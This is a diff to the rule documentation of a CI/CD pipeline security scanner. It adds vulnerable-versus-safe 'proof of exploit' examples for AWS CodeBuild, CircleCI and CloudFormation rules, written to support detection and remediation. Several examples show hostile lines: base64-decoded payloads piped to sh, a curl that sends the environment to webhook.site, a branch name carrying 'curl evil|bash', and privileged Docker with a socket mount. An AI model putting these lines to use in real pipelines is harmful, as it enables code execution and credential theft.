+        'type': 'LINUX_CONTAINER',
+        'image': 'aws/codebuild/standard:7.0',
+        'computeType': 'BUILD_GENERAL1_SMALL',
+        'privilegedMode': True,
+    },
+    # ... source / serviceRole etc.
+)
+
+# Safe: ``privilegedMode: False`` (the default). If the
+# build needs to build images, use Kaniko inside the
+# container (no host-runtime access required).
+cb.update_project(
+    name='my-build',
+    environment={
+        'type': 'LINUX_CONTAINER',
+        'image': 'aws/codebuild/standard:7.0',
+        'computeType': 'BUILD_GENERAL1_SMALL',
+        'privilegedMode': False,
+    },
+)
+```
+
 **Source:** [`CB-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `CB-003`: Build logging not enabled <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cb-003 }
@@ -2713,6 +4069,39 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 
 **Recommendation.** Switch to an AWS CodeConnections (CodeStar) connection and reference it from the source configuration. Delete any stored source credentials of type OAUTH, PERSONAL_ACCESS_TOKEN, or BASIC_AUTH via delete_source_credentials.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: CodeBuild source auth uses a stored
+# long-lived token (``OAUTH`` / ``PERSONAL_ACCESS_TOKEN``
+# / ``BASIC_AUTH``). The credential lives on the account
+# indefinitely, never rotates, and isn't revocable from
+# the AWS side. Leak = persistent SCM access.
+import boto3
+cb = boto3.client('codebuild')
+cb.import_source_credentials(
+    authType='PERSONAL_ACCESS_TOKEN',
+    serverType='GITHUB',
+    token='ghp_long_lived_pat_abc123...'   # never expires
+)
+
+# Safe: use a CodeConnections (formerly CodeStar
+# Connections) ARN as the source. The GitHub user can
+# revoke the connection without AWS-side coordination;
+# AWS refreshes the underlying token automatically.
+cb.update_project(
+    name='my-build',
+    source={
+        'type': 'GITHUB',
+        'location': 'https://github.com/myorg/myrepo.git',
+        'auth': {
+            'type': 'CODECONNECTIONS',
+            'resource': 'arn:aws:codeconnections:us-east-1:123:connection/abc-...'
+        }
+    }
+)
+```
+
 **Source:** [`CB-006`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `CB-007`: CodeBuild webhook has no filter group <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cb-007 }
@@ -2732,6 +4121,37 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 **How this is detected.** An inline buildspec (source.buildspec set to YAML text, or a S3 URL) bypasses the protections that cover your source code. A user with ``codebuild:UpdateProject`` can rewrite the build commands without touching the repository, no PR review, no branch protection, no audit of what changed. Store buildspec.yml in the repo instead.
 
 **Recommendation.** Remove the inline buildspec and store buildspec.yml in the source repository under branch protection. Anyone with codebuild:UpdateProject can silently rewrite an inline buildspec; repository-sourced buildspecs inherit the repo's review and protection controls.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``buildspec`` is inline JSON on the
+# project, not sourced from a protected repo. Anyone
+# with ``codebuild:UpdateProject`` (or who can call the
+# console UI) can rewrite the build steps without a
+# code-review trail. CodeBuild then runs the rewritten
+# spec with the project's role.
+import boto3, json
+cb = boto3.client('codebuild')
+cb.update_project(
+    name='my-build',
+    source={'type': 'NO_SOURCE',
+            'buildspec': json.dumps({'phases': {'build': {'commands': ['malicious']}}})}
+)
+
+# Safe: source ``buildspec.yml`` from a protected repo
+# branch. Changes to the build then route through PR
+# review on the SCM side, and the AWS-side ``UpdateProject``
+# call no longer carries the build's logic.
+cb.update_project(
+    name='my-build',
+    source={
+        'type': 'GITHUB',
+        'location': 'https://github.com/myorg/myrepo.git',
+        'buildspec': 'ci/buildspec.yml'   # path in the repo
+    }
+)
+```
 
 **Source:** [`CB-008`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -2753,6 +4173,38 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 
 **Recommendation.** Add an ``ACTOR_ACCOUNT_ID`` filter pattern to every webhook filter group that accepts ``PULL_REQUEST_CREATED`` / ``PULL_REQUEST_UPDATED`` / ``PULL_REQUEST_REOPENED``, or remove those PR event types. Without actor filtering, any fork can trigger a build that runs with the project's service role.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: the CodeBuild webhook filter accepts
+# ``PULL_REQUEST_CREATED`` / ``PULL_REQUEST_UPDATED``
+# events from any actor. A fork PR triggers the build
+# with the project's full role attached — including
+# any production secrets the role can read.
+import boto3
+cb = boto3.client('codebuild')
+cb.create_webhook(
+    projectName='my-build',
+    filterGroups=[[
+        {'type': 'EVENT', 'pattern': 'PULL_REQUEST_CREATED'},
+        # no ACTOR_ACCOUNT_ID filter
+    ]]
+)
+
+# Safe: add an ``ACTOR_ACCOUNT_ID`` filter that allow-
+# lists only internal accounts (and / or a
+# ``FILE_PATH`` filter that excludes paths an attacker
+# can modify in a fork PR).
+cb.update_webhook(
+    projectName='my-build',
+    filterGroups=[[
+        {'type': 'EVENT', 'pattern': 'PULL_REQUEST_CREATED'},
+        {'type': 'ACTOR_ACCOUNT_ID',
+         'pattern': '12345678|23456789|34567890'}
+    ]]
+)
+```
+
 **Source:** [`CB-010`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `CB-011`: CodeBuild buildspec contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-cb-011 }
@@ -2768,6 +4220,33 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 - Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
 - Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: the project's buildspec carries indicators
+# of malicious activity — base64-decoded execution, exfil
+# to webhook.site, miner binaries. Either the buildspec
+# was poisoned via UpdateProject (CB-008) or pulled from
+# a compromised repo.
+# (current buildspec source)
+phases:
+  build:
+    commands:
+      - echo Z2g6Li4uIA== | base64 -d | sh
+      - curl https://webhook.site/abc?env=$(env|base64)
+
+# Safe: the buildspec does only what the build needs.
+# If a check fires here, treat as incident response:
+# rotate the project's role's credentials, audit recent
+# builds, identify the commit / UpdateProject call that
+# introduced the payload.
+phases:
+  build:
+    commands:
+      - make build
+      - aws s3 cp build/ s3://artifacts-bucket/ --recursive
+```
+
 **Source:** [`CB-011`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `CC-001`: Orb not pinned to exact semver <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-001 }
@@ -2780,6 +4259,27 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``circleci/aws-cli@volatile`` (or any non-
+# semver ref) resolves at config-process time to whatever
+# the orb publisher last pushed. A compromised publisher
+# ships malicious orb steps into every consumer's pipeline.
+version: 2.1
+orbs:
+  aws-cli: circleci/aws-cli@volatile
+  python: circleci/python@dev:alpha
+
+# Safe: pin to an exact semver (``X.Y.Z``). Renovate's
+# circleci ecosystem updater bumps the pin in reviewable
+# PRs; ``@volatile`` and ``@dev:*`` never reach prod.
+version: 2.1
+orbs:
+  aws-cli: circleci/aws-cli@4.1.3
+  python: circleci/python@2.1.1
+```
+
 **Source:** [`CC-001`](../providers/circleci.md#cc-001) in the [CircleCI provider](../providers/circleci.md).
 
 ### `CC-002`: Script injection via untrusted environment variable <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cc-002 }
@@ -2790,6 +4290,38 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 
 **Recommendation.** Do not interpolate attacker-controllable environment variables (CIRCLE_BRANCH, CIRCLE_TAG, CIRCLE_PR_NUMBER, etc.) directly into shell commands. Pass them through an intermediate variable and quote them, or use CircleCI pipeline parameters instead.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a branch named ``feat;curl evil|bash;``
+# lands in the shell verbatim via ``$CIRCLE_BRANCH``. The
+# injected ``curl`` runs in the step's shell with the
+# job's full credential set in scope.
+version: 2.1
+jobs:
+  build:
+    docker:
+      - image: alpine@sha256:abc123...
+    steps:
+      - run: |
+          echo "Building $CIRCLE_BRANCH"
+          ./build.sh --branch $CIRCLE_BRANCH
+
+# Safe: assign the untrusted value to a local shell
+# variable and quote on every use. Injected
+# metacharacters stay literal.
+version: 2.1
+jobs:
+  build:
+    docker:
+      - image: alpine@sha256:abc123...
+    steps:
+      - run: |
+          branch="$CIRCLE_BRANCH"
+          echo "Building $branch"
+          ./build.sh --branch "$branch"
+```
+
 **Source:** [`CC-002`](../providers/circleci.md#cc-002) in the [CircleCI provider](../providers/circleci.md).
 
 ### `CC-003`: Docker image not pinned by digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cc-003 }
@@ -2799,6 +4331,31 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 **How this is detected.** Docker images referenced in `docker:` blocks under jobs or executors must include an `@sha256:...` digest suffix. Tag-only references (`:latest`, `:18`) are mutable and can be replaced at any time by whoever controls the upstream registry.
 
 **Recommendation.** Pin every Docker image to its sha256 digest: `cimg/node:18@sha256:abc123...`. Tags like `:latest` or `:18` are mutable, a registry compromise or upstream push silently replaces the image content.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``cimg/python:3.12`` is a mutable tag.
+# CircleCI's image team rebuilds it on every Python
+# point release; a publisher compromise ships code into
+# every pipeline that uses the tag.
+version: 2.1
+jobs:
+  test:
+    docker:
+      - image: cimg/python:3.12
+    steps:
+      - run: pytest
+
+# Safe: pin to the content-addressable digest.
+version: 2.1
+jobs:
+  test:
+    docker:
+      - image: cimg/python@sha256:abc123...  # cimg/python:3.12.1
+    steps:
+      - run: pytest
+```
 
 **Source:** [`CC-003`](../providers/circleci.md#cc-003) in the [CircleCI provider](../providers/circleci.md).
 
@@ -2857,6 +4414,42 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 **Known false positives.**
 
 - Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: the AWS access key literal lives in
+# ``environment:``. The config file is committed to git
+# and printed in build logs whenever the step echoes its
+# environment.
+version: 2.1
+jobs:
+  deploy:
+    docker:
+      - image: cimg/aws@sha256:abc123...
+    environment:
+      AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
+      AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+    steps:
+      - run: aws s3 cp build/ s3://bucket/
+
+# Safe: reference a project-level / org-level context
+# variable. The actual credential lives in CircleCI's
+# encrypted context store, masked in logs, rotatable
+# without a config-file change.
+version: 2.1
+jobs:
+  deploy:
+    docker:
+      - image: cimg/aws@sha256:abc123...
+    steps:
+      - run: aws s3 cp build/ s3://bucket/
+workflows:
+  ship:
+    jobs:
+      - deploy:
+          context: aws-deploy   # AWS_* vars resolve at runtime
+```
 
 **Source:** [`CC-008`](../providers/circleci.md#cc-008) in the [CircleCI provider](../providers/circleci.md).
 
@@ -2946,6 +4539,36 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 
 - Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``curl | bash`` install one-liner trusts
+# both the network path and the installer host. A MITM
+# or compromised endpoint ships malicious code into the
+# step's shell with the job's full credential set.
+version: 2.1
+jobs:
+  install-tools:
+    docker:
+      - image: cimg/base@sha256:abc123...
+    steps:
+      - run: curl -fsSL https://installer.example.com/cli.sh | bash
+
+# Safe: download to a file, verify a sha256 digest from
+# a trusted source, then execute.
+version: 2.1
+jobs:
+  install-tools:
+    docker:
+      - image: cimg/base@sha256:abc123...
+    steps:
+      - run: |
+          set -e
+          curl -fsSL https://installer.example.com/cli.sh -o /tmp/cli.sh
+          echo 'a1b2c3d4...  /tmp/cli.sh' | sha256sum -c -
+          bash /tmp/cli.sh
+```
+
 **Source:** [`CC-016`](../providers/circleci.md#cc-016) in the [CircleCI provider](../providers/circleci.md).
 
 ### `CC-017`: Docker run with insecure flags (privileged/host mount) <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-017 }
@@ -2957,6 +4580,37 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 **Recommendation.** Remove --privileged and --cap-add flags. Use minimal volume mounts. Prefer rootless containers.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``docker run --privileged`` plus the host
+# Docker socket gives the build container full kernel
+# access and the agent's Docker runtime. A compromise
+# escapes to the agent and from there to every other
+# build sharing it.
+version: 2.1
+jobs:
+  integration:
+    machine:
+      image: ubuntu-2204:2024.01.1
+    steps:
+      - run: |
+          docker run --privileged \
+            -v /var/run/docker.sock:/var/run/docker.sock \
+            myapp:test ./integration.sh
+
+# Safe: drop ``--privileged`` and the socket mount. If
+# the build genuinely needs to build images, use a
+# rootless sandbox (Kaniko, BuildKit rootless) instead.
+version: 2.1
+jobs:
+  integration:
+    docker:
+      - image: myapp:test@sha256:abc123...
+    steps:
+      - run: ./integration.sh
+```
 
 **Source:** [`CC-017`](../providers/circleci.md#cc-017) in the [CircleCI provider](../providers/circleci.md).
 
@@ -2970,6 +4624,38 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: pip resolves and downloads packages over
+# plaintext HTTP, so a network attacker between the
+# runner and the registry can substitute the wheel.
+# ``--trusted-host`` silences the very error that would
+# have caught the swap.
+version: 2.1
+jobs:
+  install:
+    docker:
+      - image: cimg/python@sha256:abc123...
+    steps:
+      - run: |
+          pip install --index-url http://internal-pypi.example.com/simple \
+                      --trusted-host internal-pypi.example.com \
+                      -r requirements.txt
+
+# Safe: HTTPS with the index's certificate validated.
+# Internal CA installed into the image trust store.
+version: 2.1
+jobs:
+  install:
+    docker:
+      - image: cimg/python@sha256:abc123...
+    steps:
+      - run: |
+          pip install --index-url https://internal-pypi.example.com/simple \
+                      --require-hashes -r requirements.txt
+```
+
 **Source:** [`CC-018`](../providers/circleci.md#cc-018) in the [CircleCI provider](../providers/circleci.md).
 
 ### `CC-019`: `add_ssh_keys` without fingerprint restriction <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cc-019 }
@@ -2979,6 +4665,38 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 **How this is detected.** A bare `- add_ssh_keys` step (without `fingerprints:`) loads every SSH key configured on the project into the job. This violates least privilege, the job gains access to keys it does not need, increasing the blast radius if the job is compromised.
 
 **Recommendation.** Always specify `fingerprints:` when using `add_ssh_keys` to restrict which SSH keys are loaded into the job. A bare `add_ssh_keys` step loads ALL project SSH keys.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``add_ssh_keys`` with no ``fingerprints``
+# filter loads every SSH key the project carries into
+# the agent. Any job in the workflow then uses any key
+# — a non-deploy job that runs on PR builds has the
+# production deploy key in scope.
+version: 2.1
+jobs:
+  build:
+    docker:
+      - image: cimg/base@sha256:abc123...
+    steps:
+      - add_ssh_keys
+      - run: ./build.sh
+
+# Safe: pin ``fingerprints`` to the specific key this
+# job needs. Deploy keys never leak into PR builds; a
+# leaked PR-job token can't reach the deploy SSH key.
+version: 2.1
+jobs:
+  deploy:
+    docker:
+      - image: cimg/base@sha256:abc123...
+    steps:
+      - add_ssh_keys:
+          fingerprints:
+            - "01:23:45:67:89:ab:cd:ef:01:23:45:67:89:ab:cd:ef"
+      - run: ./deploy.sh
+```
 
 **Source:** [`CC-019`](../providers/circleci.md#cc-019) in the [CircleCI provider](../providers/circleci.md).
 
@@ -3030,6 +4748,39 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``npm config set strict-ssl false`` disables
+# certificate verification for every subsequent npm call.
+# An attacker on the network path MITMs the registry and
+# ships substituted tarballs that npm installs without
+# any integrity signal.
+version: 2.1
+jobs:
+  install:
+    docker:
+      - image: cimg/node@sha256:abc123...
+    steps:
+      - run: |
+          npm config set strict-ssl false
+          npm install
+
+# Safe: install the missing CA into the image trust
+# store and keep strict-ssl on. Fix the registry's
+# certificate rather than silencing the alarm.
+version: 2.1
+jobs:
+  install:
+    docker:
+      - image: cimg/node@sha256:abc123...
+    steps:
+      - run: |
+          cp /etc/ssl/internal-ca.crt /usr/local/share/ca-certificates/
+          sudo update-ca-certificates
+          npm install
+```
+
 **Source:** [`CC-023`](../providers/circleci.md#cc-023) in the [CircleCI provider](../providers/circleci.md).
 
 ### `CC-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-024 }
@@ -3065,6 +4816,39 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 - Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
 - Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a step body contains ``curl /tmp/.miner |
+# bash`` or pipes a base64-decoded payload to ``sh``. A
+# malicious PR (or a compromised co-maintainer) plants
+# the crypto-miner / credential-stealer in the config
+# itself; every subsequent build executes the payload.
+version: 2.1
+jobs:
+  build:
+    docker:
+      - image: alpine@sha256:abc123...
+    steps:
+      - run: |
+          echo Z2g6Li4uIA== | base64 -d | sh   # obfuscated payload
+          curl https://webhook.site/abc?env=$(env|base64)
+
+# Safe: the build does only what the build does. No
+# obfuscated execution, no exfil POSTs, no ``base64
+# -d | sh`` pipelines. If a check fires here it's
+# either a compromise or a CTF fixture; treat as
+# incident-response until verified otherwise.
+version: 2.1
+jobs:
+  build:
+    docker:
+      - image: alpine@sha256:abc123...
+    steps:
+      - checkout
+      - run: make build
+```
+
 **Source:** [`CC-026`](../providers/circleci.md#cc-026) in the [CircleCI provider](../providers/circleci.md).
 
 ### `CC-027`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cc-027 }
@@ -3078,6 +4862,36 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 **Known false positives.**
 
 - ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``eval`` on a parameter value, or ``sh -c``
+# on an unquoted variable, gives the value full shell-
+# grammar reach. A pipeline parameter or upstream env
+# var carrying metacharacters executes them.
+version: 2.1
+jobs:
+  dispatch:
+    docker:
+      - image: alpine@sha256:abc123...
+    steps:
+      - run: |
+          eval "$BUILD_CMD"
+          sh -c $RAW_HOOK
+
+# Safe: replace dynamic shell evaluation with an
+# explicit dispatcher over an allow-list, or invoke a
+# script you own that does its own validation. Never
+# eval values that came from outside the step body.
+version: 2.1
+jobs:
+  dispatch:
+    docker:
+      - image: alpine@sha256:abc123...
+    steps:
+      - run: ./scripts/dispatch.sh "$BUILD_CMD"
+```
 
 **Source:** [`CC-027`](../providers/circleci.md#cc-027) in the [CircleCI provider](../providers/circleci.md).
 
@@ -3099,6 +4913,35 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 
 **Recommendation.** Pin every ``machine.image`` to a dated release tag, ``ubuntu-2204:2024.05.1`` rather than ``:current``, ``:edge``, ``:default``, or a bare image name. CircleCI rotates the ``current`` / ``edge`` aliases on its own cadence, so builds re-run on an image the author never reviewed.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``image: default`` resolves to whatever
+# CircleCI ships as the current default machine image.
+# Image updates rebuild the underlying OS / toolchain
+# silently; a compromise of the image build pipeline
+# ships malicious bytes into every machine-executor
+# pipeline that uses the default.
+version: 2.1
+jobs:
+  integration:
+    machine:
+      image: default
+    steps:
+      - run: docker compose run tests
+
+# Safe: pin to a specific image release. CircleCI's
+# release notes document each tag; pin to the SHA-
+# stamped tag rather than the rolling alias.
+version: 2.1
+jobs:
+  integration:
+    machine:
+      image: ubuntu-2204:2024.01.1
+    steps:
+      - run: docker compose run tests
+```
+
 **Source:** [`CC-029`](../providers/circleci.md#cc-029) in the [CircleCI provider](../providers/circleci.md).
 
 ### `CC-030`: Workflow job uses context without branch filter or approval gate <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-030 }
@@ -3119,6 +4962,44 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 
 **Recommendation.** Restrict every workflow job that passes a cloud ``role_arn`` (or equivalent OIDC parameter) to a protected branch list, or require a ``type: approval`` predecessor. Without either gate, any push triggers a cloud-role assumption with the full blast radius of the IdP-side trust policy.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``aws-cli/oidc-assume-role`` runs from a
+# job with no branch filter and no approval gate. The
+# AWS trust policy on the assumed role accepts any OIDC
+# token from the project, including tokens minted by
+# PR builds. A fork-PR build assumes the prod role and
+# does whatever the role permits.
+version: 2.1
+orbs:
+  aws-cli: circleci/aws-cli@4.1.3
+workflows:
+  deploy:
+    jobs:
+      - aws-cli/oidc-assume-role:
+          role-arn: arn:aws:iam::123:role/prod-deploy
+          # no branch filter, no approval gate
+
+# Safe: branch-filter to ``main`` (or the release
+# branches you trust) AND add a hold step requiring
+# human approval. The OIDC token mint is now gated
+# behind both source-branch and human gates.
+version: 2.1
+orbs:
+  aws-cli: circleci/aws-cli@4.1.3
+workflows:
+  deploy:
+    jobs:
+      - hold:
+          type: approval
+          filters: { branches: { only: main } }
+      - aws-cli/oidc-assume-role:
+          requires: [hold]
+          role-arn: arn:aws:iam::123:role/prod-deploy
+          filters: { branches: { only: main } }
+```
+
 **Source:** [`CC-031`](../providers/circleci.md#cc-031) in the [CircleCI provider](../providers/circleci.md).
 
 ### `CCM-000`: CodeCommit API access failed <span class="pg-sev pg-sev--info">INFO</span> { #detail-ccm-000 }
@@ -3138,6 +5019,37 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 **How this is detected.** Approval-rule templates are CodeCommit's analog of GitHub's branch-protection require-review. Without one associated, the repository accepts merges from any push-permitted principal, including the PR author themselves, without any second-pair-of-eyes gate.
 
 **Recommendation.** Create a CodeCommit approval-rule template requiring at least one approval from a designated pool of reviewers and associate it with every repository. Without one, any PR author with push rights can self-approve and merge.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a CodeCommit repository with no approval
+# rule template attached. Pull requests merge without
+# any reviewer requirement; a single contributor with
+# write access can ship code into the default branch
+# without review.
+import boto3
+cc = boto3.client('codecommit')
+# Empty list returned:
+cc.list_associated_approval_rule_templates_for_repository(
+    repositoryName='my-repo'
+)  # -> {'approvalRuleTemplateNames': []}
+
+# Safe: create an approval rule template (at least one
+# reviewer required) and attach it to the repository.
+cc.create_approval_rule_template(
+    approvalRuleTemplateName='require-1-reviewer',
+    approvalRuleTemplateContent='''{"Version": "2018-11-08",
+      "DestinationReferences": ["refs/heads/main"],
+      "Statements": [{"Type": "Approvers",
+        "NumberOfApprovalsNeeded": 1,
+        "ApprovalPoolMembers": ["arn:aws:sts::123:assumed-role/Developers/*"]}]}'''
+)
+cc.associate_approval_rule_template_with_repository(
+    approvalRuleTemplateName='require-1-reviewer',
+    repositoryName='my-repo'
+)
+```
 
 **Source:** [`CCM-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -3188,6 +5100,33 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 **How this is detected.** AllAtOnce shifts 100% of traffic to the new revision in one step. There's no gradient to halt on if a CloudWatch alarm trips mid-rollout, the bad revision is already serving every request. Canary / linear configs introduce the shift-then-watch shape that lets monitors catch a regression before it's universal.
 
 **Recommendation.** Switch to a canary or linear deployment configuration (e.g. CodeDeployDefault.LambdaCanary10Percent5Minutes or a custom rolling config) so that defects are caught before they affect all instances or traffic.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``CodeDeployDefault.AllAtOnce``. Every
+# deploy ships to every instance simultaneously. A bad
+# build (or a malicious one) takes the entire fleet down
+# at once; there's no canary window in which a regression
+# could be caught before customer-facing impact.
+import boto3
+cd = boto3.client('codedeploy')
+cd.create_deployment_group(
+    applicationName='my-app',
+    deploymentGroupName='prod',
+    deploymentConfigName='CodeDeployDefault.AllAtOnce',
+    # ...
+)
+
+# Safe: a canary / linear / blue-green config. Bad
+# deploys are caught before they reach the full fleet.
+cd.update_deployment_group(
+    applicationName='my-app',
+    currentDeploymentGroupName='prod',
+    deploymentConfigName='CodeDeployDefault.LambdaCanary10Percent5Minutes',
+    # or 'CodeDeployDefault.HalfAtATime' / 'CodeDeployDefault.OneAtATime'
+)
+```
 
 **Source:** [`CD-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -3263,6 +5202,37 @@ Resources:
 
 **Recommendation.** Move the secret into Secrets Manager (or SSM Parameter Store SecureString) and reference it via ``'{{resolve:secretsmanager:…}}'`` at deploy time. Never literal-string a credential into a stateful resource — the value lives in the template, the stack history, and any drift detection report.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a stateful resource carries a plaintext
+# secret literal. The template is committed to git;
+# CloudFormation stores the secret in stack drift / events
+# / parameter overrides — visible to anyone with
+# ``cloudformation:DescribeStack*``.
+Resources:
+  Db:
+    Type: AWS::RDS::DBInstance
+    Properties:
+      DBInstanceClass: db.t3.medium
+      Engine: postgres
+      MasterUsername: appuser
+      MasterUserPassword: hunter2-prod-master-pw
+
+# Safe: reference a Secrets Manager dynamic reference.
+# CloudFormation resolves the secret at stack-update
+# time; the template carries only the ARN.
+Resources:
+  Db:
+    Type: AWS::RDS::DBInstance
+    Properties:
+      DBInstanceClass: db.t3.medium
+      Engine: postgres
+      MasterUsername: appuser
+      MasterUserPassword:
+        '{{resolve:secretsmanager:prod/db/master:SecretString:password}}'
+```
+
 **Source:** [`CF-002`](../providers/cloudformation.md) in the [CloudFormation provider](../providers/cloudformation.md).
 
 ### `CF-003`: CodeBuild VPC config references a public subnet <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cf-003 }
@@ -3272,6 +5242,46 @@ Resources:
 **How this is detected.** When ``AWS::CodeBuild::Project.Properties.VpcConfig.VpcId`` resolves to a concrete reference, walks every ``AWS::EC2::Subnet`` in the same VPC and fires if any has ``MapPublicIpOnLaunch: true``.
 
 **Recommendation.** Place CodeBuild projects in private subnets (``MapPublicIpOnLaunch: false``) with egress routed through a NAT gateway or VPC interface endpoints. Public subnets put the build host on a public IP for the duration of the build.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: the CodeBuild project's VpcConfig points
+# at a subnet whose ``MapPublicIpOnLaunch: true``. The
+# build host gets a public IP for the duration of the
+# build; outbound traffic doesn't go through NAT, and
+# the host is reachable inbound (modulo SG rules).
+Resources:
+  Subnet:
+    Type: AWS::EC2::Subnet
+    Properties:
+      CidrBlock: 10.0.1.0/24
+      MapPublicIpOnLaunch: true
+  Build:
+    Type: AWS::CodeBuild::Project
+    Properties:
+      VpcConfig:
+        VpcId: !Ref VPC
+        Subnets: [!Ref Subnet]
+        SecurityGroupIds: [!Ref BuildSG]
+
+# Safe: route the project through a private subnet.
+# Egress goes via a NAT gateway; no public IP on the
+# build host.
+Resources:
+  PrivateSubnet:
+    Type: AWS::EC2::Subnet
+    Properties:
+      CidrBlock: 10.0.10.0/24
+      MapPublicIpOnLaunch: false
+  Build:
+    Type: AWS::CodeBuild::Project
+    Properties:
+      VpcConfig:
+        VpcId: !Ref VPC
+        Subnets: [!Ref PrivateSubnet]
+        SecurityGroupIds: [!Ref BuildSG]
+```
 
